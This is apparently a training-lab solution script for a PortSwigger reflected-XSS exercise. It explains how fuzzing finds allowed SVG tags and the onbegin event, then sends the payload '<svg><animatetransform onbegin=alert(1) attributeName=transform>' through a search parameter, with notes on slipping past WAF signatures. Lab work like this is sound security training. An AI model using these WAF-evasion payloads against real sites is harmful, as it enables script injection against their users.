# Lab 19 — Reflected XSS with some SVG markup allowed
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
#
# Vulnerability: Search — WAF blocks most tags but allows some SVG elements
# Aim:           Call alert via an SVG-specific event
#
# Technique:
#   Fuzzing reveals that <svg>, <animatetransform>, <image>, and <title> are allowed.
#   Fuzzing events on <animatetransform> reveals onbegin is allowed.
#
#   onbegin fires when an SVG animation begins — fires immediately on page load.
#   attributeName=transform is required for <animatetransform> to be valid SVG.
#
#   Payload:
#     <svg><animatetransform onbegin=alert(1) attributeName=transform>
#
#   WAFs that block HTML events (onclick, onload) often miss SVG-specific events.
#   SVG and MathML namespaces are the go-to after standard tags are blocked.
#
# Usage: python xss_lab19.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<svg><animatetransform onbegin=alert(1) attributeName=transform>"

if __name__ == "__main__":
    banner()
    section("LAB 19 — REFLECTED XSS: SVG MARKUP ALLOWED (onbegin EVENT)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab19.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending SVG payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "SVG onbegin payload")

    print()
    print("  ➜  Open this URL in a browser — onbegin fires when SVG animation starts:")
    print(f"     {r.url}")
    print("  ℹ  SVG events (onbegin, onend, onrepeat) are missed by most WAF signatures.")
